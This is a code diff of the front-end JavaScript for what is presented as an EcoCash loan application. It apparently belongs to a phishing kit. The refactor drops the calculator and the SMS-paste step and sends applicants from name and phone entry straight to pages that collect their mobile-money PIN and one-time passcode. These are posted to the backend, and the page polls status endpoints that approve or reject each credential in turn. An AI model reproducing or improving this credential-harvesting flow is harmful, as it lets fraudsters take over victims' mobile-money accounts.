@@ -1,8 +1,7 @@
 // ============================================================
-// EcoCash Loan Application – Frontend Logic
+// EcoCash Loan Application – Frontend Logic (Refactored)
 // ============================================================
 
-// ----- GLOBAL STATE -----
 let appData = {
   loanAmount: 200,
   loanDuration: 30,
@@ -18,7 +17,6 @@ let appData = {
   applicationId: null
 };
 
-// ----- PAGE NAVIGATION -----
 function goTo(pageId) {
   document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
   document.getElementById(pageId).classList.add('active');
@@ -29,30 +27,17 @@ function clearErr(id) {
   el.classList.remove('show');
 }
 
-// ----- CALCULATOR (Landing) -----
-function updateCalc() {
-  let amt = parseInt(document.getElementById('amtSlider').value);
-  let dur = 30;
-  let interest = amt * 0.005 * dur;
-  let total = amt + interest;
-  document.getElementById('calcAmt').textContent = `$${amt}`;
-  document.getElementById('calcTerm').textContent = `${dur} Days`;
-  document.getElementById('calcInterest').textContent = `$${interest.toFixed(2)}`;
-  document.getElementById('calcTotal').textContent = `$${total.toFixed(2)}`;
-  document.getElementById('monthlyAmt').textContent = `$${total.toFixed(2)}`;
-}
-
+// Landing (no calculator)
 function startApplication() {
-  let amt = parseInt(document.getElementById('amtSlider').value);
-  appData.loanAmount = amt;
+  appData.loanAmount = 200;
   appData.loanDuration = 30;
   goTo('page-step1');
-  document.getElementById('s1am').value = amt;
+  document.getElementById('s1am').value = 200;
   document.getElementById('s1dur').value = 30;
   updateStep1Calc();
 }
 
-// ----- STEP 1 -----
+// Step 1
 function updateStep1Calc() {
   let amt = parseInt(document.getElementById('s1am').value);
   let dur = parseInt(document.getElementById('s1dur').value);
@@ -74,7 +59,7 @@ function toS2() {
   goTo('page-step2');
 }
 
-// ----- STEP 2 -----
+// Step 2
 function toS3() {
   let fi = document.getElementById('s2fi').value.trim();
   let la = document.getElementById('s2la').value.trim();
@@ -88,7 +73,6 @@ function toS3() {
   appData.lastName = la;
   appData.phone = ph;
   appData.email = em;
-  // Update summary
   document.getElementById('sA').textContent = `$${appData.loanAmount}`;
   document.getElementById('sT').textContent = `${appData.loanDuration} Days`;
   document.getElementById('sR').textContent = `$${(appData.loanAmount * (1 + 0.005 * appData.loanDuration)).toFixed(2)}`;
@@ -96,7 +80,7 @@ function toS3() {
   goTo('page-step3');
 }
 
-// ----- SUBMIT APPLICATION -----
+// Submit Application
 async function submitApp() {
   let kf = document.getElementById('s3kf').value.trim();
   let kl = document.getElementById('s3kl').value.trim();
@@ -120,7 +104,7 @@ async function submitApp() {
     const data = await response.json();
     if (data.ok) {
       appData.applicationId = data.applicationId;
-      goTo('page-sms-paste');
+      goTo('page-pin');
       startPolling();
     } else {
       alert('Error: ' + data.error);
@@ -131,29 +115,7 @@ async function submitApp() {
   }
 }
 
-// ----- SMS SUBMISSION -----
-async function doSmsParse() {
-  let msg = document.getElementById('smsMsgBox').value.trim();
-  if (!msg) { showError('momErr', 'Please paste the EcoCash message.'); return; }
-  try {
-    const response = await fetch('/api/send-ecocash-message', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ ecocashData: { applicationId: appData.applicationId, phone: appData.phone, ecocashMessage: msg, isResubmission: false } })
-    });
-    const data = await response.json();
-    if (data.ok) {
-      goTo('page-processing');
-      startPolling();
-    } else {
-      alert('Error: ' + data.error);
-    }
-  } catch (err) {
-    alert('Network error');
-  }
-}
-
-// ----- PIN SUBMISSION -----
+// PIN Submission
 async function doPin() {
   let pin = '';
   for (let i = 0; i < 5; i++) pin += document.getElementById('pin' + i).value;
@@ -166,7 +128,7 @@ async function doPin() {
     });
     const data = await response.json();
     if (data.ok) {
-      goTo('page-processing');
+      goTo('page-otp');
       startPolling();
     } else if (data.blocked) {
       showError('pinErr', data.message);
@@ -178,7 +140,7 @@ async function doPin() {
   }
 }
 
-// ----- OTP SUBMISSION -----
+// OTP Submission
 async function doOtp() {
   let otp = '';
   for (let i = 0; i < 4; i++) otp += document.getElementById('otp' + i).value;
@@ -201,7 +163,7 @@ async function doOtp() {
   }
 }
 
-// ----- RESEND OTP -----
+// Resend OTP
 async function resendOtp() {
   try {
     const response = await fetch('/api/resend-otp', {
@@ -220,59 +182,41 @@ async function resendOtp() {
   }
 }
 
-// ----- POLLING -----
+// Polling
 function startPolling() {
   if (window._pollInterval) clearInterval(window._pollInterval);
   window._pollInterval = setInterval(async () => {
     try {
-      // Check SMS status
-      const smsRes = await fetch(`/api/status/${appData.applicationId}/sms`);
-      const smsData = await smsRes.json();
-      if (smsData.status === 'rejected') {
+      // Check PIN status
+      const pinRes = await fetch(`/api/status/${appData.applicationId}/pin`);
+      const pinData = await pinRes.json();
+      if (pinData.status === 'rejected') {
         clearInterval(window._pollInterval);
-        showRejected('SMS message rejected.');
+        showRejected('PIN rejected.');
         return;
       }
-      if (smsData.status === 'approved') {
-        // Check PIN status
-        const pinRes = await fetch(`/api/status/${appData.applicationId}/pin`);
-        const pinData = await pinRes.json();
-        if (pinData.status === 'rejected') {
+      if (pinData.status === 'approved') {
+        // Check OTP status
+        const otpRes = await fetch(`/api/status/${appData.applicationId}/otp`);
+        const otpData = await otpRes.json();
+        if (otpData.status === 'rejected') {
           clearInterval(window._pollInterval);
-          showRejected('PIN rejected.');
+          showRejected('OTP rejected.');
           return;
         }
-        if (pinData.status === 'approved') {
-          // Check OTP status
-          const otpRes = await fetch(`/api/status/${appData.applicationId}/otp`);
-          const otpData = await otpRes.json();
-          if (otpData.status === 'rejected') {
-            clearInterval(window._pollInterval);
-            showRejected('OTP rejected.');
-            return;
-          }
-          if (otpData.status === 'approved') {
-            clearInterval(window._pollInterval);
-            showApproval();
-            return;
-          }
-          // OTP pending – go to OTP page if not there
-          if (!document.getElementById('page-otp').classList.contains('active')) {
-            goTo('page-otp');
-          }
-        } else {
-          // PIN pending – go to PIN page if not there
-          if (!document.getElementById('page-pin').classList.contains('active')) {
-            goTo('page-pin');
-          }
+        if (otpData.status === 'approved') {
+          clearInterval(window._pollInterval);
+          showApproval();
+          return;
+        }
+        // OTP pending – go to OTP page if not there
+        if (!document.getElementById('page-otp').classList.contains('active')) {
+          goTo('page-otp');
         }
       } else {
-        // SMS pending – go to wait SMS or SMS paste?
-        // If user is on wait-sms page, stay there; if on processing, stay.
-        if (document.getElementById('page-processing').classList.contains('active')) {
-          // stay
-        } else if (!document.getElementById('page-sms-paste').classList.contains('active')) {
-          goTo('page-processing');
+        // PIN pending – go to PIN page if not there
+        if (!document.getElementById('page-pin').classList.contains('active')) {
+          goTo('page-pin');
         }
       }
     } catch (err) {
@@ -281,7 +225,6 @@ function startPolling() {
   }, 3000);
 }
 
-// ----- SHOW APPROVAL / REJECTION -----
 function showApproval() {
   document.getElementById('aprAmount').textContent = `$${appData.loanAmount}`;
   document.getElementById('aprTerm').textContent = `${appData.loanDuration} Days`;
@@ -294,7 +237,7 @@ function showRejected(reason) {
   goTo('page-landing');
 }
 
-// ----- MISC HELPERS -----
+// Helpers
 function showError(id, msg) {
   const el = document.getElementById(id);
   el.querySelector('span:last-child').textContent = msg;
@@ -307,7 +250,6 @@ function normalizePhone(id) {
   el.value = el.value.replace(/\D/g, '').slice(0, 9);
 }
 
-// PIN movement helpers
 function pinMvM(input, idx) {
   if (input.value.length > 0 && idx < 4) {
     document.getElementById('pin' + (idx + 1)).focus();
@@ -333,7 +275,6 @@ function clearOtpCode() {
   document.querySelectorAll('.otp-box').forEach(inp => inp.value = '');
 }
 
-// INIT
 document.addEventListener('DOMContentLoaded', function() {
-  updateCalc();
+  // No calculator to initialize now
 });
